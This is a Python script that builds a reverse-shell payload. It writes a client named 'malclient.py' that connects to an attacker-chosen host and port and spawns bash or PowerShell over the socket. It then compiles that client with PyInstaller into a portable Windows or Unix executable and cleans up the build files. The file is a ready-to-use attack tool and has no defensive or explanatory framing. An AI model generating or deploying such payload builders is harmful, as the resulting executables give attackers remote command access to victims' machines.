import os, subprocess, shutil

# Function to delete the files and directories
def remove_paths(paths):
    print("[*] Performing Clean-Up. . .")
    for path in paths:
        if os.path.isdir(path):  # If it's a directory
            try:
                shutil.rmtree(path)  # Remove the entire directory and its contents
                print(f"Directory {path} has been deleted.")
            except Exception as e:
                print(f"Error deleting directory {path}: {e}")
        elif os.path.isfile(path):  # If it's a file
            try:
                os.remove(path)  # Remove the file
                print(f"File {path} has been deleted.")
            except Exception as e:
                print(f"Error deleting file {path}: {e}")
        else:
            print(f"Path {path} does not exist or is not a valid file/directory.")

def MoveExecutable(osTarget:str, unixPorts):
    if osTarget.lower() not in unixPorts:
        shutil.move("dist/malclient.exe", ".")
        print("[+] Created malclient.exe! (Windows Executable)")
    else:
        shutil.move("dist/malclient", ".")
        print("[+] Created malclient! (Unix Executable)")

def CreateScript(lhost:str,lport:str,osTarget:str):
    # create target lists
    unixPorts = ["unix", "linux"]
    winPorts = ["windows", "win", "nt"]

    # create mass list
    validTargets = unixPorts + winPorts

    if osTarget.lower() not in validTargets:
        print(f"[-] {osTarget.lower()} is not a valid target OS")
        return False
    
    shellType = ""
    if osTarget.lower() not in unixPorts:
        shellType = "powershell.exe"
    else:
        shellType = "/bin/bash"
    
    # Executable will create a reverse shell connection via pty
    baseScript = f"""import socket, threading, subprocess, os, pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((\"{lhost}\",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn(\"{shellType}\")
"""
    with open('malclient.py', 'w') as MalScript:
        MalScript.write(baseScript)

    print(f"[+] Created malclient.py")
    print("[*] Building portable executable. . .")

    # run a system command to run pyinstaller
    buildcmd = 'pyinstaller --log-level=WARN --onefile malclient.py'
    
    subprocess.run(buildcmd, shell=True)
    remove_paths(['malclient', 'malclient.exe', 'malclient.spec'])
    MoveExecutable(osTarget,unixPorts)
    remove_paths(['__pycache__', 'build', 'dist'])

    return True